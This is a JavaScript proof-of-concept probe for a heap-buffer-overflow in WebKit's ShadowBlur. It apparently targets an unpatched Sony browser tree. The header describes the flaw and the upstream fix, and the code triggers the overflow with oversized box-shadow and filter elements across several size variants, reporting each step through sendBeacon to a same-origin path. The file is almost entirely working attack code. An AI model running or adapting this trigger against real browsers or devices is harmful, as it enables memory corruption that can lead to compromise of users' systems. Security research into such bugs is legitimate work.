// Candidate: heap-buffer-overflow in WebCore::ShadowBlur::blurShadowBuffer
//
// Upstream fix 1e8c797c (bugs.webkit.org 264978) changes one argument:
//     blurLayerImage(layerData->bytes(), blurRect.size(), blurRect.width() * 4)
//  -> blurLayerImage(layerData->bytes(), layerData->size(), layerData->size().width() * 4)
//
// `getPixelBuffer()` clamps what it returns to the image bounds, but the old code kept
// passing the *requested* rect, so the blur walks past the end of the buffer whenever
// the shadow's template size exceeds what the ImageBuffer could allocate. Huge box-shadow
// geometry gets you there, which makes this pure CSS: no keyboard, no user gesture, and
// nothing that needs a JIT.
//
// Sony's tree still has the old form. This probe reproduces the upstream regression test
// and then tries a couple of size variants.
(function () {
  var SENT = {};
  function B(tag) {
    if (SENT[tag]) return;
    SENT[tag] = 1;
    try { navigator.sendBeacon('/beacon/' + tag + '?t=' + Date.now()); } catch (e) {}
  }

  B('SB-BOOT');

  var css = document.createElement('style');
  css.textContent =
    'body{background:#111;color:#eee;font:20px/1.4 monospace;margin:0;padding:20px}' +
    '.huge{position:absolute;left:0;top:0;border-radius:5px;' +
    'box-shadow: blue 1.76px 0px 10px 24px inset;filter:sepia(1)}';
  document.head.appendChild(css);

  document.body.innerHTML = '<h2>ShadowBlur OOB</h2><div id="s">running variants…</div>';

  var variants = [
    ['V0', 33554432, 33554432, 'blue 1.76px 0px 10px 24px inset', 'sepia(1)'],
    ['V1', 16777216, 16777216, 'blue 1.76px 0px 10px 24px inset', 'sepia(1)'],
    ['V2', 33554432, 64, 'red 0px 0px 200px 400px', 'blur(1px)'],
    ['V3', 4194304, 4194304, 'black 0px 0px 500px 500px', 'blur(0px)']
  ];

  var i = 0;
  function next() {
    if (i >= variants.length) { B('SB-SURVIVED-ALL'); document.getElementById('s').textContent = 'all variants survived'; return; }
    var v = variants[i++];
    var tag = v[0];
    var d = document.createElement('div');
    d.className = 'huge';
    d.style.width = v[1] + 'px';
    d.style.height = v[2] + 'px';
    d.style.boxShadow = v[3];
    d.style.filter = v[4];
    B('SB-' + tag + '-BEFORE');
    document.body.appendChild(d);
    // force style + layout, then let the blur run on the next rendering update
    void d.offsetWidth;
    getComputedStyle(d).boxShadow;
    requestAnimationFrame(function () {
      requestAnimationFrame(function () {
        B('SB-' + tag + '-AFTER');
        d.remove();
        setTimeout(next, 120);
      });
    });
  }

  setTimeout(next, 300);
})();
